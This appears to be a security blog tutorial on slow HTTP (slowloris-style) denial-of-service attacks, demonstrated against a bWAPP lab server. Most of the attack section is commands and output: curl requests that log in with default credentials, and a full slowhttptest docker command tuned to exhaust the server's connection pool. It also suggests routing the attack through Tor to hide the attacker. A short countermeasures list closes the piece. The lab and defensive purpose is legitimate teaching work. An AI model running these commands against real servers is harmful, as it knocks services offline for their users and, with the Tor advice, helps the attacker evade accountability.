= Asymmetric DoS, slow HTTP attack

Have you ever heard the story of David and Goliath?
David, a young boy, goes out to confront a giant, named Goliath.
David is the underdog in this fight and is expected to lose.
But, everyone underestimates David and his prowess with a slingshot.
When David ultimately kills Goliath,
he demonstrates that even a little guy can triumph
over the biggest and strongest of enemies.

Fine! Today we are going to talk about unequal scenarios.
Furthermore, we are going to battle one ourselves.

== Let's get started

So, let’s imagine, for a moment,
that all you need to kill the giant,
that everyone fears, is a little slingshot,
not a big mace, nor the strength of a thousand men.
Sound crazy? Well, it is. But it’s possible.

A cyber attack is considered "asymmetric"
in the sense that you only need a few resources,
in this case, a laptop,
in order to cause a considerable amount of damage,
malfunction or failure in the server.
A very real case of David vs. Goliath.

If we push hard enough, the server is going to stop providing the service to
other users, in other words, we will cause a _Denial of Service_ (DoS).

== How does a slow http attack work?

Imagine a line at the local fast food restaurant.
A customer at the head of the line
can't decide if he wants a burger or a hot-dog.
People behind him in line are getting mad;
they aren't getting their food
because he is holding up the whole line.

If you look at it in more detail,
all this customer needed to do was to "not know what to order".
His indecision basically caused a denial of service
for every other person waiting behind him at the counter, i.e. A DoS.

Now imagine the same line,
but the customer at the counter knows what he wants to order,
and he's ordering a thousand burgers and a hundred hot-dogs.
Again, this means everyone behind him in line
will have to wait while his order is filled.
The restaurant can take no more orders until his is complete.

The HTTP protocol works similarly, it requires requests to be fully received by
the final user before they are processed.

Two things can happen, if a request is not completed,
the server can either wait
or set the request as timed out after some few seconds.
However, if you let the request complete,
but at a slow rate, then the server will keep the resource busy
waiting for the end of the data.

What would happen if the customer orders a thousand burgers
and a hundred hot-dogs, but he can't decide
which sauces and drinks to order with them?
And, to make matters worse, he seems to be intentionally indecisive
and he's speaking very slowly.

The answer:

[button]#link:https://cwe.mitre.org/data/definitions/400.html[D.o.S.]#

This is exactly the idea behind a slow HTTP attack.

A web server keeps its active connections
in a relatively small connection pool.
We will try to tie all the connections in this pool
to slow requests, making the server reject other users.

== Let's do an HTTP request

First, let’s run a
[button]#link:http://www.itsecgames.com/[bWAPP]#
server on ip _192.168.56.101_.

.BWAPP server
image::bwapp-running.png[bwapp-running]

For now, let’s assume that we are at:

----
192.168.56.101/bWAPP/xss_post.php.
----

And we entered in the form:

.XSS page and input
image::xss-login-form.png[xss-login-form]

Once we access a page,
the browser is going to ask the server for some resources
(images, texts, `HTML` pages, `CSS` and `JavaScript` files, etc)
and we can see these requests and responses
from the command line using `curl`
(or Google Chrome, or Firefox, or `BURP`).

The process using _curl_ is:

[source, bash, linenums]
----
$ # login to the server so we can see as a logged user the page we want
$ curl -L -c post_login_cookie 'http://192.168.56.101/bWAPP/login.php' \
--data 'login=bee&password=bug&security_level=0&form=submit'
$ # result: a file is saved with name 'post_login_cookie'
$
$ # submit a post request with the data we want on the field
$ curl -L -b post_login_cookie -v \
-d "firstname=test1&lastname=test2&form=submit" \
http://192.168.56.101/bWAPP/xss_post.php
$ # output is displayed to console, we'll see it in a moment
----

As mentioned before,
every single resource is going to have a request and a corresponding response.
In other words, we are asking the server for the _xss_post.php_ resource with
the parameters:

.POST Parameters
[source, bash, linenums]
----
firstname=test1&lastname=test2&form=submit
----

Since we want to se an HTML page, _curl_ asks for it:

.curl, server request output
[source, bash, linenums]
----
*   Trying 192.168.56.101...
* TCP_NODELAY set
* Connected to 192.168.56.101 (192.168.56.101) port 80 (#0)
> POST /bWAPP/xss_post.php HTTP/1.1
> Host: 192.168.56.101
> User-Agent: curl/7.58.0
> Accept: */*
> Cookie: PHPSESSID=5fvb1fr053gmc2f91ooicvf1f5; security_level=0
> Content-Length: 41
> Content-Type: application/x-www-form-urlencoded
----

And the server replies with:

.curl, server response output
[source, bash, linenums]
----
* upload completely sent off: 41 out of 41 bytes
< HTTP/1.1 200 OK
< Date: Thu, 15 Nov 2018 21:31:32 GMT
< Server: Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 with
Suhosin-Patch proxy_html/3.0.1 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14
OpenSSL/0.9.8k Phusion_Passenger/4.0.38 mod_perl/2.0.4 Perl/v5.10.1
< X-Powered-By: PHP/5.3.2-1ubuntu4.30
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 11291
< Content-Type: text/html
----

At this point,
nothing stops us from sending follow up headers with random values:

.POST Parameters
[source, bash, linenums]
----
firstname=FASLDKJFEI&lastname=test2&form=submit
----

wait some seconds...

.POST Parameters
[source, bash, linenums]
----
firstname=IEU182KSZ&lastname=test2&form=submit
----

And nothing stops us from simulating a slow connection
on each one of these requests,
so the server is going to have to wait
until we receive the full resource.

Why not do a thousand requests
until every single connection available on the server pool
is busy with us?

To do this, we are going to use a tool.

== Using slowhttptest

First, let's pull the
link:https://hub.docker.com/r/frapsoft/slowhttptest/[slowhttptest docker image]
from the docker hub.

.Bash command
[source, bash, linenums]
----
$ docker pull frapsoft/slowhttptest
----

And write the following command:

.Bash command
[source, bash, linenums]
----
$ sudo docker run --name DoSBWAPP --rm  frapsoft/slowhttptest \
-c 65539 -B -i 10 -l 300 -r 10000 -s 16384 -t firstname \
-u "http://192.168.56.101/bWAPP/xss_get.php" -x 10 -p 300
----

The parameters you see are described below:

.Slowhttptest description
|====
|-c 65539| use 65539 connections
|-B|specify to slow down the http in message body mode
|-i 10|seconds of interval between follow up data, per connection
|-l 300| duration of the test in seconds
|-p 300|timeout in seconds to wait for HTTP response on probe connection,
after which server is considered inaccessible
|-r 10000| connections per second
|-s 16384|value of Content-Length header
|-x 10|max length of follow up data in bytes
|-t firstname|add ?firstname=(-x 10bytes) to the target url
|-u URL|target URL
|====

While the attack is running a user that tries to access the service is going
to see:

.BWAPP is trying to connect without success
image::bwapp-while-attacking.png[bwapp-while-attacking]

If the attack is long enough, it is going to get timed out:

.BWAPP gets timed-out
image::bwapp-timed-out.png[bwapp-timed-out]

Once the attack is finished everything returns to a normal state:

.BWAPP working normally after attack
image::bwapp-attack-finished.png[bwapp-attack-finished]

Since we only need a few resources (the internet and a laptop)
we can even do it on a low-bandwidth connection.
Moreover, since we don't need too much bandwidth,
we can pass everything through a proxy
in the tor network and hide ourselves.

== Sounds scary, how do I protect myself?

Counter-measures depend mainly on your service.
Some useful mechanisms to prevent this kind of attacks are:

* Limit the number of resources an unauthorized user can expend.
* Set the header and message body to a maximum reasonable length.
* Define a minimum incoming data rate, and drop those that are slower.
* Set an absolute connection timeout.
* Use a Web Application Firewall.
* Reject connections with verbs not supported by the URL.

In cases where you need to set minimum and maximum limits,
it's a good idea to use the values from your statistics.
If the value is too short, you may risk dropping legitimate connections;
if it is too long, you won't get any protection from attacks.
Perhaps using a margin ranging
from one to two link:https://en.wikipedia.org/wiki/Normal_distribution#/media/File:Empirical_Rule.PNG[standard deviations]
may help you with this.
